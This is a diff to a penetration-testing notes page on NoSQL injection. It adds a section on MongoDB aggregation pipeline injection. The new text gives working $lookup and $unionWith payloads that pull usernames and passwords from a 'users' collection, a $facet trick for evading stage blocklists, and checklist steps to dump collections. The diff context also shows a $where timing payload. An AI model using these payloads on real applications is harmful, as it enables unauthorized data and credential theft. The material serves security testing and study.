@@ -1,6 +1,6 @@
 # NoSQL Injection
 
-#NoSQLi #NoSQL #injection #WebAppAttacks #MongoDB
+#NoSQLi #NoSQL #injection #WebAppAttacks #MongoDB #Redis #CouchDB #ElasticSearch #AggregationPipeline #AuthBypass #NoSQLMap #mongosh
 
 ## What is this?
 
@@ -16,10 +16,10 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 
 | Tool | Purpose |
 |---|---|
-| `NoSQLMap` | Automated MongoDB injection and exploitation |
-| `Burp Suite` | Manual operator injection testing |
-| `mongosh` | MongoDB shell — test payloads directly |
-| `nosqli` | NoSQL injection scanner — `github.com/Charlie-belmer/nosqli` |
+| [[Tools/Database/NoSQLMap\|NoSQLMap]] | Automated MongoDB injection and exploitation |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Manual operator injection testing |
+| [[Tools/Database/mongosh\|mongosh]] | MongoDB shell — test payloads directly |
+| [[Tools/Database/nosqli\|nosqli]] | NoSQL injection scanner (Go) — lighter, web-focused |
 
 ---
 
@@ -37,7 +37,6 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 | `$nin` | Not in array | Bypass blocklists |
 
 ---
-
 
 ## Detection
 
@@ -176,6 +175,51 @@ If MongoDB is configured with `$where` support (older versions):
 ```
 
 > `$where` is disabled by default in modern MongoDB. Worth trying on older boxes.
+
+---
+
+## Aggregation Pipeline Injection
+
+The modern high-impact MongoDB NoSQLi class. When user input reaches an aggregation pipeline (or the app lets a client supply pipeline stages), you can inject stages that reach **other collections entirely** — this is the NoSQL equivalent of a `UNION`/`JOIN`, and it works on current MongoDB with `$where` long disabled. Look for it wherever a search/filter/report feature builds a `.aggregate([...])` call.
+
+### `$lookup` — cross-collection data theft
+
+`$lookup` joins another collection into the current result. Inject it to pull data out of a collection you were never meant to reach (e.g. read `users` from an endpoint that only queries `products`).
+
+```json
+// Injected stage — join the "users" collection and leak it into results
+{ "$lookup": {
+    "from": "users",
+    "localField": "anything",
+    "foreignField": "nonexistent",
+    "as": "leaked"
+} }
+
+// Pull it into the output where you can read it
+{ "$lookup": { "from": "users", "pipeline": [], "as": "leaked" } },
+{ "$unwind": "$leaked" },
+{ "$project": { "leaked.username": 1, "leaked.password": 1 } }
+```
+
+### `$unionWith` — union-style exfil (MongoDB 4.4+)
+
+`$unionWith` appends another collection's documents to the result set — the cleanest cross-collection dump when it's available.
+
+```json
+{ "$unionWith": { "coll": "users" } }
+{ "$unionWith": { "coll": "users", "pipeline": [ { "$project": { "username": 1, "password": 1 } } ] } }
+```
+
+### Detection
+
+```text
+# Add pipeline-stage operators to your injection wordlist and watch for errors/behavior change:
+$lookup   $unionWith   $match   $group   $facet   $graphLookup
+```
+
+> [!tip] `$facet` is worth trying when a single injected stage is filtered — it lets you run multiple sub-pipelines in one stage and can smuggle a `$lookup` past a naive stage-name blocklist.
+
+> [!warning] `$lookup`/`$unionWith` against a large collection can be very heavy — an unbounded join can hang the DB. Add a `$limit` stage and scope the `pipeline` before running it on anything you don't own.
 
 ---
 
@@ -355,6 +399,11 @@ $gt → %24gt
    - {"$where": "var d=Date.now();while(Date.now()-d<5000){};return true"} — time-based (busy-loop; sleep() unavailable in $where)
    - Only works on older/misconfigured MongoDB
 
+5b. Aggregation pipeline injection (works on modern MongoDB)
+   - Add $lookup / $unionWith / $facet to the injection wordlist
+   - {"$unionWith": {"coll": "users"}} — dump another collection
+   - $lookup to join+leak a collection you shouldn't reach
+
 6. Automate
    - NoSQLMap for scan + exploit
    - Burp Intruder for regex brute force
@@ -367,5 +416,5 @@ $gt → %24gt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-31*
+*Model: claude-opus-5*
